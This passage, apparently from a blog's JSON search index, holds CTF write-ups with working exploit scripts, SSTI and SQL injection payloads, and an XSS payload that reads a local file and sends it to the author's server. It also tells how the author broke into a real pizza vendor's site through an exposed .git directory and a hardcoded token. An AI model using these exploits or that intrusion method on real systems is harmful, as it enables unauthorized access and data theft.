whitespaces or \u0026ldquo;/\u0026rdquo;, there are only four extensions that are allowed (js|ts|c|cpp) .\nAfter reading carefully the source code, I was pretty sure that we will use http parameters pollution because there is no check concerning the type of get parameters so we can enter an array and try to exploit the misbehaviour that may occur.\nLet\u0026rsquo;s imagine that we enter the following array :\n [\u0026quot;../../\u0026quot;,\u0026quot;../../\u0026quot;,\u0026quot;../../\u0026quot;,\u0026quot;../../\u0026quot;,\u0026quot;../../proc/self/cwd/flag.txt\u0026quot;,\u0026quot;.\u0026quot;,\u0026ldquo;js\u0026rdquo;]\n  1st Check : if (file.includes(' ') || file.includes('/'))  When includes is applied to an array it will check if there\u0026rsquo;s a field that is equal to the passed parameter (\u0026quot; \u0026quot; and \u0026ldquo;/\u0026rdquo; in our case) which is false here so we can successfully pass this check\n 2nd Check : if (!allowedFileType(file))  Let\u0026rsquo;s take a look at the code of this function :\nfunction allowedFileType(file) { const format = file.slice(file.indexOf('.') + 1); if (format == 'js' || format == 'ts' || format == 'c' || format == 'cpp') { return true; } return false; }  It will slice our array beginning from the indexOf(\u0026quot;.\u0026quot;)+1 so in our case the result will be the last field of our array which is \u0026ldquo;js\u0026rdquo; and Bingo we will also pass this check :D\nThe following lines will remove the last two fields of our array :\nif (file.length \u0026gt; 5) { file = file.slice(0, 5); }  so our array will become:\n [\u0026quot;../../\u0026quot;,\u0026quot;../../\u0026quot;,\u0026quot;../../\u0026quot;,\u0026quot;../../\u0026quot;,\u0026quot;../../proc/self/cwd/flag.txt\u0026quot;]\n And finally after resolving the path returnedFile will contain /proc/self/cwd/flag.txt\nconst returnedFile = path.resolve(__dirname + '/' + file);  Note: __dirname which is the current directory is ignored because of our \u0026ldquo;../../\u0026rdquo; fields, and /proc/self/cwd is equivalent to the current directory.\nSo finally our array will be resolved to the path we want, this is the final payload which is only a traduction to what we said before:\nhttp://chall.csivit.com:30222/getfile?file[]=../../\u0026amp;file[]=../../\u0026amp;file[]=../../\u0026amp;file[]=../../\u0026amp;file[]=../../proc/self/cwd/flag.txt\u0026amp;file[]=.\u0026amp;file[]=js  It was a really nice task so thanks to the author!\nThe Usual Suspects 499pts (32 solves) Visiting the website, a well trained eye can directly notice the possibility of an SSTI attack in icecream parameter.\nWe thought that it was a typical SSTI task but unfortunately even after getting RCE using the usual jinja2 SSTI payloads we didn\u0026rsquo;t find anything. The first payload we used:\n {{ \u0026lsquo;\u0026rsquo;.class.mro[1].subclasses()[270](\u0026lsquo;ls\u0026rsquo;,shell=True,stdout=-1).communicate()}}\n After this step we really didn\u0026rsquo;t know what to do, the server used here was Tornado, which is an asynchronous python web server so I started reading its documentation and I noticed that the Main class always inherits from tornado.web.RequestHandler. After some digging I got a nice idea , what if we list all the subclasses of Object ( The super class, it\u0026rsquo;s the parent of all classes) Then we will list the subclasses of tornado.web.RequestHandler and finally we will check the globals of get function from MainHadnler class.\n Get the RequestHandler class:   {{ \u0026lsquo;\u0026rsquo;.class.mro[1].subclasses()[363]}}\n  Get the MainHandler class which inherits from RequestHandler   {{ \u0026lsquo;\u0026rsquo;.class.mro[1].subclasses()[363].subclasses()[-1]}}\n And finally we will see the globals of get function ( globals is a reference to the dictionary that holds the function’s global variables ). Final payload:\n{{ ''.__class__.__mro__[1].__subclasses__()[363].__subclasses__()[-1].get.__globals__}}  Bingo we got our flag :D I asked the admin and he told me that this is the unintended solution of the task.\nIf you have any questions you can contact me on twitter @BelkahlaAhmed1 or contact our team twitter @FwordTeam ! I hope that you liked the writeup, and don\u0026rsquo;t forget to participate in FwordCTF on 29th of August , a lot of fun challenges will be there.\n","date":1595318400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1595318400,"objectID":"4c19a2dfc3f4ed7c359776d7b1855b24","permalink":"https://ahmed-belkahla.me/post/csictf2020/","publishdate":"2020-07-21T08:00:00Z","relpermalink":"/post/csictf2020/","section":"post","summary":"Web exploitation writeups of CSICTF 2k20 - File Library Task and The Unusual Suspects Web tasks","tags":null,"title":"CSICTF 2k20 - Web Exploitation","type":"post"},{"authors":null,"categories":null,"content":"How i hacked a famous pizza vendor in Tunisia ? Generally i\u0026rsquo;m not a fan of bug bounty programs but this time i tried to test my skills in some real world scenario and participate to secure some tunisian websites as they lack a lot of things in term of security :D It\u0026rsquo;s 11h pm and i was sitting on my laptop like always doing an annoying java homework for school when i felt hungry :( and accidentally an X pizza (we will call it X pizza as i was asked to not reveal the company name) ad catched my eye on facebook. I decided to take a look on their website and try to find a way to break it.\nExploitation I started browsing the website and doing some basic recon , it was a typical wordpress website without any catching exploits or some really outdated plugins . I have also ran the famous Wpscan and tried to brute force the admin account but unfortunately i got nothing.\nMy next step was trying to explore if there\u0026rsquo;s some insecure code management and Bingo it appeared that the developers forgot the .git directory there, so we can dump the source code of the web app. I used the famous gitdumper and extractor shell scripts to do that and we were so lucky! i found some juicy informations there ( a database backup for all users and promo codes , wp-config file containing all secret codes and salts used to hash users passwords ..) This was really some juicy informations but i wanted to explore more , i started reviewing the source code and after a while i found an awesome api , it checks a hardcoded token and then using only a phone number as input it logins to the phone number owner account :o\nWhy do they use it ? This api was meant to be accessed only from the call service employees and the developer told me that only some white listed ips were allowed to visit it. It was like a secret hidden backdoor .\nHowever using the hardcoded token we can access any account , you may be asking how i found the phone number of a privileged user , the database didn\u0026rsquo;t have any useful informations for this (it was an old DB) so i had to think for a while and finally i remembered that i found and old list of orders informations in the uploads directory and usually the first order will be passed by the developer to test the web app so i searched there for a little bit and Bingo after entering the phone number w got access to the admin dashboard :D\nI wanted to stop here but i think it was possible to get a reverse shell by modifying the templating files and i believe that they are using a shared server (many websites hosted on the same server) so going so far won\u0026rsquo;t be a good idea .\nI really had fun trying to break the website, the developer was so nice and fixed this out so quickly and for me i had to skip my morning classes as i completed all this at 4 am and i had to complete my annoying homework tomorrow in the lunch break.\nFor those asking i didn\u0026rsquo;t get any bounties for this , i didn\u0026rsquo;t even expect that xd\nThank you for reading this article, i hope you enjoyed your ride, don\u0026rsquo;t forget to take a look at my previous articles and follow me on twitter for more exciting content :D\n","date":1590570000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1590570000,"objectID":"d6b01c8c107a69f1038d70c21126a024","permalink":"https://ahmed-belkahla.me/post/how_i_hacked_a_famous_tunisian_pizza_vendor/","publishdate":"2020-05-27T09:00:00Z","relpermalink":"/post/how_i_hacked_a_famous_tunisian_pizza_vendor/","section":"post","summary":"How i hacked a famous pizza vendor in Tunisia ? Generally i\u0026rsquo;m not a fan of bug bounty programs but this time i tried to test my skills in some real world scenario and participate to secure some tunisian websites as they lack a lot of things in term of security :D It\u0026rsquo;s 11h pm and i was sitting on my laptop like always doing an annoying java homework for school when i felt hungry :( and accidentally an X pizza (we will call it X pizza as i was asked to not reveal the company name) ad catched my eye on facebook.","tags":null,"title":"How i hacked a famous pizza vendor in Tunisia ?","type":"post"},{"authors":null,"categories":null,"content":"To make sure that i learned something well , i always want to write an article about that topic and it\u0026rsquo;ll be an opportunity to do more researchs about it. The last two days our team Fword participated in two CTFs (UMD CTF and WPICTF) and we were among the top 20 teams in both CTFs so GJ guys \u0026lt;3 anyway that\u0026rsquo;s why i decided to choose the best pwn tasks and write these detailed writeups about them to be a great practical introduction for people who want to dive into binary exploitation .\nNote: This article assumes that you have basic knowledge of assembly and C language\nSummary 1- Jump Not Found From UMD CTF : heap based overflow\n2- Dorsia3 From WPI CTF: Format string Vulnerability\nJump Not Found 400pts (25 solves) Note: You can Download the binary HERE, give it a try alone before reading the writeup that\u0026rsquo;s the best way to LEARN .\nTL;DR   Exploit a Heap based overflow to overwrite a function address with the Win function address\n  Bypass a little problem of the presence of \u0026ldquo;0x0a\u0026rdquo;(\u0026quot;\\n\u0026quot;) in the Win function address\n  Introduction Before diving into the exploitation part , let\u0026rsquo;s talk about the heap section ,you have probably heard or used malloc or calloc functions in C , these functions are used to allocate memory on the heap,it is a region of your computer\u0026rsquo;s memory that is not managed automatically for you and used for dynamic memory allocation, unlike the stack which we dont have full control over it.\nThe allocation algorithm in an abstract way is quite simple , we won\u0026rsquo;t dive into too much details , when for example we want to allocate a chunk of 16 bytes using malloc, it\u0026rsquo;s reserved in the heap and malloc returns the address of the beginning of the chunk where we can store the data we want.\nYou may be asking how your computer knows where the next free chunk starts ? That\u0026rsquo;s quite simple, before each allocated chunk its size is allocated just before it, so the address of the next free chunk will be :\n Address of the beginning of chunk1 + Its size\n This was in a really abstract way , you can do more research alone if you are interested , there is a lot of ressources in the internet :D\nExploitation Let the fun begin now :D after downloading the binary let\u0026rsquo;s do some basic reverse engineering and read carefully its code , i used ghidra for that purpose , you can download it from its official website.\nObserving the main function , we can notice that it\u0026rsquo;s allocation two chunks , the first one its size is 0x42 (66 bytes) where our input will be stored and a second chunk which holds an array of function pointers , and based on our input (1 or 2 or 3) the program will call the appropriate function from the heap .\nlocal_20 = (char *)malloc(0x42); local_18 = (code **)malloc(0x18); *local_18 = jumpToHoth; local_18[1] = jumpToCoruscant; local_18[2] = jumpToEndor;  Of course as the most vigilant readers noticed , it\u0026rsquo;s using the dangerous function gets so we have the possibility to overflow stuffs :D Now here is our plan:\nWe will abuse the gets function and overwrite the jumpToHoth address with jumpToNaboo function which will prints the flag for us Before that we need to figure out the offset so let\u0026rsquo;s open the binary in gdb, set a breakpoint after gets and enter a simple pattern\nAfter that let\u0026rsquo;s visualize the interesting part of the heap\nAs you can see the \u0026ldquo;AAAAAAAABBBBBBBB\u0026rdquo; that we have entered followed by the array of function pointers , so the offset is obvious now which is 80, let\u0026rsquo;s begin writing our exploit :\nfrom pwn import * p=process(\u0026quot;./JNF\u0026quot;) #p=remote(\u0026quot;192.241.138.174\u0026quot;,9996) p.recvuntil(\u0026quot;CONSOLE\u0026gt;\u0026quot;) WIN=p64(0x000000000040070e) OFFSET=\u0026quot;1\u0026quot;+\u0026quot;A\u0026quot;*79 payload=OFFSET payload+=WIN p.sendline(payload) log.info(\u0026quot;Found Flag ! \u0026quot;) p.interactive()  The reason why i wrote *OFFSET=\u0026ldquo;1\u0026rdquo;+\u0026ldquo;A\u0026rdquo;79 is that if you have read the code carefully we will notice that the choice of the function that will be executed is loaded from the beginning of the chunk (which is logic) so i wanted to do it in one shot.\ngets(local_20); lVar2 = strtol(local_20,\u0026amp;local_28,10); *(short *)(local_20 + 0x40) = (short)lVar2; sVar1 = *(short *)(local_20 + 0x40); if (sVar1 != 2) break; puts(\u0026quot;Checking navigation...\u0026quot;); (*local_18[1])(); } if (2 \u0026lt; sVar1) break; if (sVar1 == 1) { .....  Why 0x000000000040070e not the real address 0x000000000040070a\nAs we know gets function stops when it encounters \u0026ldquo;\\n\u0026rdquo; (0x0a) so entering the real address of the win function will terminate our input and thus we will never be able to write the address where we want :( Fortunately observing the assembly code of jumpToNaboo function we will see that we can start from the address that holds the part we want , which is printing the flag :\nAnd Finally running the exploit will bring the flag for us :D\nThat was a quite simple example of exploiting a heap based overflow thus it was only solved by 25 teams from 321 teams . Let\u0026rsquo;s pass now to the second task which is a format string vulnerability.\nDorsia3 250pts (55 solves) Note: You can Download the binary HERE and the libc HERE, give it a try alone before reading the writeup that\u0026rsquo;s the best way to LEARN .\nTL;DR  Exploit a format string vulnerability to overwrite the return pointer + Libc one gadget  Introduction As a quick introduction this is a brief explanation of the format string vulnerability :\n format string is a type of software vulnerability. Originally thought harmless, format string exploits can be used to crash a program or to execute harmful code. The problem stems from the use of unchecked user input as the format string parameter in certain C functions that perform formatting, such as printf(). A malicious user may use the %s and %x format tokens, among others, to print data from the call stack or possibly other locations in memory. One may also write arbitrary data to arbitrary locations using the %n format token, which commands printf() and similar functions to write the number of bytes formatted to an address stored on the stack. Wikipedia\n A quick Example :\nIf things are not clear for you you can search for more ressources about format string vulnerabilities . Let the hack begin now :D\nExploitation In this task we are given the source code of the task , the binary and the libc .\nAs you can see we can notice the format string vulnerability in the printf function and we have a leak of our buffer address in the stack and the system function.\nLet\u0026rsquo;s do some static analysis , running the file and checksec commands , we get these results:\nSo we have a 32 bit binary with PIE and NX protections enabled , so we won\u0026rsquo;t be able to overwrite the GOT entry of a function since its address is randomized .\nLet\u0026rsquo;s Get our hands dirty\nFirstly , let\u0026rsquo;s create a pad function to make sure that the offset won\u0026rsquo;t change and let\u0026rsquo;s find the offset of our format string to know exactly where our buffer starts.\nfrom pwn import * def pad(str): return str+(60-len(str))*\u0026quot;B\u0026quot; p=process(\u0026quot;./nanoprint\u0026quot;) p.recvline() p.sendline(pad(\u0026quot;BAAAA%p|%p|%p|%p|%p|%p|%p|%p|%p|\u0026quot;)) p.interactive()  So our offset will be 7 , now let\u0026rsquo;s talk about our scenario , we will overwrite the saved eip with a one gadget from the libc ==\u0026gt; Spawn a shell \\o/\nWe have all we need , an address from the stack and the system function address from libc, so let\u0026rsquo;s write our exploit and retrieve these address properly\nfrom pwn import * def pad(str): return str+(60-len(str))*\u0026quot;B\u0026quot; p=process(\u0026quot;./nanoprint\u0026quot;) #p=remote(\u0026quot;dorsia3.wpictf.xyz\u0026quot;,31337) data=p.recvline() BUFFER=int(data[:10],16) SYSTEM=int(data[-11:-1],16)+288 log.info(\u0026quot;Buffer starts: \u0026quot;+hex(BUFFER)) log.info(\u0026quot;System address: \u0026quot;+hex(SYSTEM)) pause() p.sendline(pad(\u0026quot;JUNK\u0026quot;)) p.interactive()  Since we have the libc binary let\u0026rsquo;s calculate the libc base , and using gdb lets run the first part of our exploit and try to figure the offset between our buffer and the saved eip :\n1- Run our little exploit\n2- run gdb with the following command:\n gdb -p `pidof nanoprint`\n So the offset is 0x71 ,finally let\u0026rsquo;s choose the one gadget , i have used the famous one_gadget tool\nAfter some debugging with gdb i figured that the constraints of this magic gadget are verified so we will use it in our exploit\n 0x3d0e0 execve(\u0026quot;/bin/sh\u0026quot;, esp+0x40, environ)\n  constraints:\n  esi is the GOT address of libc\n  [esp+0x40] == NULL\n now we have everything we need let\u0026rsquo;s finish our exploit :\nfrom pwn import * def pad(str): return str+(60-len(str))*\u0026quot;B\u0026quot; #p=process(\u0026quot;./nanoprint\u0026quot;) p=remote(\u0026quot;dorsia3.wpictf.xyz\u0026quot;,31337) data=p.recvline() BUFFER=int(data[:10],16) SYSTEM=int(data[-11:-1],16)+288 log.info(\u0026quot;Buffer starts: \u0026quot;+hex(BUFFER)) log.info(\u0026quot;System address: \u0026quot;+hex(SYSTEM)) BASE=SYSTEM-0x3d200 one_gadget=BASE+0x3d0e0 RET=BUFFER+0x71 RET2=RET+2 log.info(\u0026quot;Writing to: \u0026quot;+hex(RET)) payload=\u0026quot;B\u0026quot; payload+=p32(RET) payload+=p32(RET2) off1=(one_gadget \u0026amp; 0xffff)-9 #First 2 bytes off2=int(hex(one_gadget \u0026amp; 0xffff0000)[:-4],16)-(one_gadget \u0026amp; 0xffff) log.info(\u0026quot;one gadget address: \u0026quot;+hex(one_gadget)) log.info(\u0026quot;offset1 and 2: \u0026quot;+str(off1)+\u0026quot;|\u0026quot;+str(off2)) payload+=\u0026quot;%\u0026quot;+str(off1)+\u0026quot;x\u0026quot; payload+=\u0026quot;%7$hn\u0026quot; payload+=\u0026quot;%\u0026quot;+str(off2)+\u0026quot;x\u0026quot; payload+=\u0026quot;%8$hn\u0026quot; #pause() p.sendline(pad(payload)) p.interactive() #Offset buffer-ret : +0x71 #offset fmt 7  Running our exploit will spawn the shell for us \\o/\nThank you for reading the whole writeup :D I hope you liked it , you can check my github repo where i share my CTF writeups ! Arigatoo \\o/\n","date":1587412800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1587412800,"objectID":"38cc1f3fbd3cc44a3fe78f7c61512b36","permalink":"https://ahmed-belkahla.me/post/detailed-pwn-writeups/","publishdate":"2020-04-20T20:00:00Z","relpermalink":"/post/detailed-pwn-writeups/","section":"post","summary":"Detailed binary exploitation writeups from UMD CTF and WPICTF , heap based overflow and format string vulnerability.","tags":null,"title":"Detailed Writeups - Binary Exploitation","type":"post"},{"authors":null,"categories":null,"content":"Hello guys , HackZone VIII CTF has ended this morning , i participated with my team Fword and we got the 4th place, here is my writeup for the three web challenges I managed to solve :D\nBabyWeb1(722pts)(10 solves) In this task we are given a platform where we can share a picture with some msg and it generates a password for us to access these details ,there are already some pictures posted by the author, so we have to access them and maybe the flag in the details of one of them.\nTrying to post a picture with the same title of the posted pictures will be denied so let\u0026rsquo;s try SQL truncation attack and submit a picture with these details :\n Title : \u0026ldquo;naaah \u0026quot; url : \u0026ldquo;anything here\u0026rdquo; -msg : \u0026ldquo;anything\u0026rdquo;  And Bingo it passed the title check and we got a password :D\nUsing this password will give us the details of the picture and the flag if we check the source code :D\nInsecure(884pts)(4 solves) I really had a lot of fun playing this task ,we are given a text to image converter website , as the description said the first part of the flag is due to a misconfiguration so the first thing i thinked about is a bucket misconfig and it was the case.\nAccessing this url will give us the first part (The same bucket where Hackzone Logo is stored)\n https://storage.googleapis.com/hzviii/flag_part1.txt\n 1st Part: HZVIII{Buck3t_M1sc0nf1gur4t1on_\nLet\u0026rsquo;s start the second part which is the most interesting , we have to read this file /psycor/flag_part2.txt , so the first thing i thinked about was abusing an SSRF and read local files . It was a php website so firstly i thinked that maybe we will use an exploit in the famous GD library of php or something like that but it was only a rabbit hole xd\nAfter some enumeration i discovered that we have an XSS here , so things are becoming clearer maybe it\u0026rsquo;s using phantom Js to convert this text .\nOur scenario now is revealed , we\u0026rsquo;ll exploit this XSS vulnerability to read local files , we have also to mention that the script tag was filtered . I passed a lot of time in this part and tried a lot with basically this payload but i didn\u0026rsquo;t get anything :\n\u0026lt;img src=\u0026quot;aa\u0026quot; onerror=\u0026quot;function reqListener () { var encoded = encodeURI(this.responseText); var b64 = btoa(this.responseText); var raw = this.responseText; document.write('\u0026lt;iframe src=\u0026quot;http://100.26.206.184:1234/?a='+b64+'\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;'); } var oReq = new XMLHttpRequest(); oReq.addEventListener('load', reqListener); oReq.open('GET', 'file:///psycor/flag_part2.txt'); oReq.send();\u0026quot;\u0026gt;  I have than tried to read it using iframes but i didn\u0026rsquo;t have any results :'(\nThis was really painful xd i thinked that maybe using onerror attribute , phantom Js won\u0026rsquo;t wait until XMLHttpRequest fetch the content of the file , so maybe we have to use the script tag ? But it\u0026rsquo;s filtered so all we have to do is bypass this filter :D\nAs we see in the picture below , the script word is stripped so what if we enter :\n scscriptript\n The script word will be stripped and Bingo we will have our script tag , let\u0026rsquo;s try it\nYeees It workeed :D so now how will we use the script tag ? we will simply try to convert this line now :\n\u0026lt;scscriptript src=\u0026quot;http://100.26.206.184:1234/test.js\u0026quot;\u0026gt;\u0026lt;/scscriptript\u0026gt;  NOTE : It\u0026rsquo;s my VPS IP so DONT use it :D\nAnd i hosted the test.js file in my server , this is its content , we will try to read the file using XMLHttpRequest so basically the same payload as below\nfunction reqListener () { var encoded = encodeURI(this.responseText); var b64 = btoa(this.responseText); var raw = this.responseText; document.write('\u0026lt;iframe src=\u0026quot;http://100.26.206.184:1234/?a='+b64+'\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;'); } var oReq = new XMLHttpRequest(); oReq.addEventListener(\u0026quot;load\u0026quot;, reqListener); oReq.open(\u0026quot;GET\u0026quot;, \u0026quot;file:///psycor/flag_part2.txt\u0026quot;); oReq.send();  And yees we received an answer :D\nBase64 decoding it will give us the last part of the flag :D I really enjoyed this task so thank you @PsycoR for your efforts\nCalculator(722pts)(10 solves) This task was pretty obvious , we have x and y parameters and the web app calculates their division , if we enter any character we will have the error page and Bingo debug mode is true :D\nWe will now leak the Secret key of the app and sign a session cookie that has the attribute \u0026ldquo;is_admin\u0026rdquo; set to True .\nTo do that we will use flask-unsign tool with the following command :\n flask-unsign \u0026ndash;sign \u0026ndash;cookie \u0026ldquo;{\u0026lsquo;is_admin\u0026rsquo;: True}\u0026rdquo; \u0026ndash;secret \u0026lsquo;DeRz7YDZ5nCDqR3vt33QpuhkrSYLmuX8\u0026rsquo; \u0026ndash;legacy\n And changing the cookie will give us the flag !\nI want to thank the organizers for this cool CTF and nice tasks, unfortunately i didn\u0026rsquo;t have enough time to look at pwn tasks :( I really have to sleep now so if you have any questions contact me on Twitter @BelkahlaAhmed1\n","date":1586650244,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1586650244,"objectID":"1c5a2f32bd14bf04489c0075204d25df","permalink":"https://ahmed-belkahla.me/post/hackzone-viii/","publishdate":"2020-04-12T00:10:44Z","relpermalink":"/post/hackzone-viii/","section":"post","summary":"Web writeups for Hackzone VIII CTF","tags":null,"title":"HackZone VIII - Web Writeups","type":"post"},{"authors":null,"categories":null,"content":"pwn1(70pts) It was a ret2libc task , but we had firstly to leak the libc base address using BOF (i leaked it through printf address) than we will return to main and perform our ret2 System :D here is my exploit, if you have any questions you can contact me on twitter @BelkahlaAhmed1\nfrom pwn import * p=remote(\u0026quot;pwn1-01.play.midnightsunctf.se\u0026quot;,10001) #p=process(\u0026quot;./pwn1\u0026quot;) OFFSET=cyclic(72) POP_RDI_RET=p64(0x0000000000400783) PUTS=p64(0x0000000000400550) LEAK=p64(0x602020) MAIN=p64(0x400698) payload=OFFSET+POP_RDI_RET+LEAK+PUTS+MAIN log.info(\u0026quot;Payload Crafted\u0026quot;) p.recvuntil(\u0026quot;buffer:\u0026quot;) log.info(\u0026quot;Sending payload\u0026quot;) #raw_input(\u0026quot;attach\u0026quot;) p.sendline(payload) data=p.recvline().strip() leak=u64(data.ljust(8,\u0026quot;\\x00\u0026quot;)) BASE_LIBC=leak-0x64e80 # local 0x54a20 log.info(\u0026quot;leaked libc base: \u0026quot;+hex(BASE_LIBC)) p.recvuntil(\u0026quot;buffer:\u0026quot;) #BINSH=p64(BASELIBC+0x183cee) #SYSTEM=p64(BASELIBC+0x46ed0) RET=p64(0x0000000000400536) SYSTEM=p64(BASE_LIBC+0x4f440) BINSH=p64(BASE_LIBC+0x1b3e9a) payload=OFFSET+RET+POP_RDI_RET+BINSH+SYSTEM p.sendline(payload) p.interactive()  NOTE: Check Task files ** HERE **\npwn2(80pts) It was a really fun task , we had a format string vulnerability , so firstly i overwrited the GOT entry of the exit function with main address so we have now an infinite loop and the program will never exit , than using format string we leak the libc base address and than we overwrite the GOT entry of printf with the address of system :D Here is my exploit , if you have any questions you can contact me o twitter @BelkahlaAhmed1\nfrom pwn import * def extract(add,n): p1=\u0026quot;0x\u0026quot;+add[-4:] p2=add[:6] if n==1: return p1 if n==2: return p2 def pad(payload): return payload+\u0026quot;X\u0026quot;*(63-len(payload)) #p=process(\u0026quot;./pwn2\u0026quot;) p=remote(\u0026quot;pwn2-01.play.midnightsunctf.se\u0026quot;,10002) p.recvuntil(\u0026quot;input:\u0026quot;) EXITGOT=p32(0x804b020) EXITGOT2=p32(0x804b020+2) ''' s=\u0026quot;\u0026quot; for i in range(27,34): s+=\u0026quot;%\u0026quot;+str(i)+\u0026quot;$p \u0026quot; ''' payload=EXITGOT+EXITGOT2 payload+=\u0026quot;%2044x%8$hn%32231x%7$hn\u0026quot; #raw_input(\u0026quot;attach\u0026quot;) p.sendline(pad(payload)) p.recvuntil(\u0026quot;input:\u0026quot;) p.sendline(pad(\u0026quot;%30$x\u0026quot;)) data=p.recvuntil(\u0026quot;X\u0026quot;) printf=int(\u0026quot;0x\u0026quot;+data[-9:-1],16)-5 LIBCBASE=printf-0x50b60 log.info(\u0026quot;Leaked Libc Base : \u0026quot;+hex(LIBCBASE)) p.recvuntil(\u0026quot;input:\u0026quot;) PRINTFGOT=p32(0x804b00c) PRINTFGOT2=p32(0x804b00c+2) SYSTEM=LIBCBASE+0x3cd10 log.info(\u0026quot;System address: \u0026quot;+hex(SYSTEM)) payload=PRINTFGOT payload+=PRINTFGOT2 p1=int(extract(hex(SYSTEM),1),16) p2=int(extract(hex(SYSTEM),2),16) log.info(\u0026quot;P1: \u0026quot;+str(p1-8)+\u0026quot; P2: \u0026quot;+str(p2-p1)) payload+=\u0026quot;%\u0026quot;+str(p1-8)+\u0026quot;x%7$hn%\u0026quot;+str(p2-p1)+\u0026quot;x%8$hn\u0026quot; log.info(\u0026quot;Payload crafted\u0026quot;) p.sendline(pad(payload)) p.recvuntil(\u0026quot;input:\u0026quot;) p.sendline(\u0026quot;/bin/sh\u0026quot;) p.interactive() #Main address 0x80485eb # 7 stack adress  NOTE: Task files  HERE\nThese tasks were really fun, i\u0026rsquo;m sorry for the lack of details because i\u0026rsquo;m really busy this period :(\n","date":1585958400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1585958400,"objectID":"525946de77e6864e40805467cb9a5d55","permalink":"https://ahmed-belkahla.me/post/midnight-sun-ctfquals/","publishdate":"2020-04-04T00:00:00Z","relpermalink":"/post/midnight-sun-ctfquals/","section":"post","summary":"pwn1(70pts) It was a ret2libc task , but we had firstly to leak the libc base address using BOF (i leaked it through printf address) than we will return to main and perform our ret2 System :D here is my exploit, if you have any questions you can contact me on twitter @BelkahlaAhmed1","tags":null,"title":"Midnight Sun CTF Quals 2020 - Pwn Writeups","type":"post"},{"authors":null,"categories":null,"content":"B64DECODER (244pts) This is wont be a detailed writeup , however in this task we have a clear format string vulnerability (line 23) and a leak of a64l function address\nThe idea is to overwrite the GOT entry of a64l function with the address of system in libc (not system@plt) using the format string vulnerability , it\u0026rsquo;s also a partial overwrite because we have a limited length of input (32 characters) and using the leaked address of a64l we can easily know the address of system function , here is my exploit :\nfrom pwn import * import struct import sys def pad(str): return str+\u0026quot;X\u0026quot;*(32-len(str)) payload=\u0026quot;\u0026quot; #p=process(\u0026quot;./b64decoder\u0026quot;) p=remote(\u0026quot;challenges.tamuctf.com\u0026quot;,2783) d=p.recvuntil(\u0026quot;name!\u0026quot;) A64Ladd=d[:-18][-10:] TOWRITE=\u0026quot;0x\u0026quot;+A64Ladd[-4:] sys=int(TOWRITE,16)-1680-4 #A64l-0x690 log.info(TOWRITE) log.info(sys) A64L_PLT=0x804b398 a64lADD=p32(A64L_PLT) payload+=a64lADD payload+=\u0026quot;%\u0026quot;+str(sys)+\u0026quot;x%71$hn\u0026quot; log.info(\u0026quot;payload crafted\u0026quot;) p.sendline(payload) log.info(\u0026quot;Sent , Haaaw el shell\u0026quot;) p.interactive()  And Bingo we got our shell :D\nNOTE: Task files  HERE\nTROLL (50pts) In this task we are supposed to win a game by guessing the next 100 random numbers , looking at the source code we can see the vulnerable gets function , after that we are setting the seed value to the time and finally the beginning of the loop and generating the random numbers and questions each time .\nMy idea was to overwrite the seed value with our own value than BINGO we can generate the next random numbers and win the game , i have done things manually , i entered a unique seaquence and than observed with gdb if i have overwritten where the seed value is stored\nMy input :\n AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ\n I have entered a sequence of alphabet characters and stopped in the call of srand function , you can see te RDI register(where the 1st argument passed to a function is stored) hold the value of \u0026ldquo;MMMM\u0026rdquo; so if we replace \u0026ldquo;MMMM\u0026rdquo; with the value we want , this value will be the seed for the random numbers.\nI have written this little C program to generate 100 random numbers using our chosen seed and stored them in a file :\n#include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;time.h\u0026gt; int main(int argc, char *argv[]){ int i=0; int seed=3472328296227680305 //0x1000 in decimal srand(seed); for(i=0;i\u0026lt;=99;i++){ int a=rand()% 100000 + 1; printf(\u0026quot;%d\\n\u0026quot;,a); } return 0; }  After that i have written this exploit to overwrite the seed value with 0x1000 and answer the questions using the numbers we have generated\nfrom pwn import * #p=process(\u0026quot;./troll\u0026quot;) p=remote(\u0026quot;challenges.tamuctf.com\u0026quot;,4765) p.recvuntil(\u0026quot;Who goes there?\u0026quot;) SEED=\u0026quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP1000\u0026quot; p.sendline(SEED) log.info(\u0026quot;Sent First payload\u0026quot;) answers=open(\u0026quot;answer\u0026quot;,\u0026quot;r\u0026quot;) for line in answers: p.recvuntil(\u0026quot;What is it?\u0026quot;) log.info(\u0026quot;sending answer: \u0026quot;+line) p.sendline(line) p.interactive()  Note: the offset in the remote server is different, so i had to guess it xD However we got our flag :\nNOTE: Task files  HERE\nThis is the first time writing a pwn writeup so i hope you enjoyed it , any questions you can find me on twitter @BelkahlaAhmed1\n","date":1585526400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1585526400,"objectID":"8885cf0419d47e79f6839de4334aaead","permalink":"https://ahmed-belkahla.me/post/tamuctfpwn/","publishdate":"2020-03-30T00:00:00Z","relpermalink":"/post/tamuctfpwn/","section":"post","summary":"B64DECODER (244pts) This is wont be a detailed writeup , however in this task we have a clear format string vulnerability (line 23) and a leak of a64l function address","tags":null,"title":"TAMU CTF 2020 - Pwn Writeups","type":"post"},{"authors":null,"categories":null,"content":"The after-Prequal (971pts) (19 Solves) This task was so fun and i learned new things from it , we are given a website with a search functionality and after testing a single quote injection we had an SQL error , so let\u0026rsquo;s start the exploitation of the famous SQL injection :D\nAfter the basic enumeration we can notice that these characters are filtered : [\u0026quot; \u0026ldquo;,\u0026quot;-\u0026rdquo;,\u0026quot;,\u0026quot;] so we will use the following bypasses:\n The white space : %0A The \u0026ldquo;-\u0026rdquo; : we will use # to comment The \u0026ldquo;,\u0026rdquo; : we will use join to bypass it  This step took me some time , after some tries i succeeded in equilibrating the query :\n ?search=')union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A2)b%0Ajoin%0A(select%0A3)c)%0A%23\n And BINGO ! we succeeded to inject , all we have to do know is to dump the database as usual\n Tables:   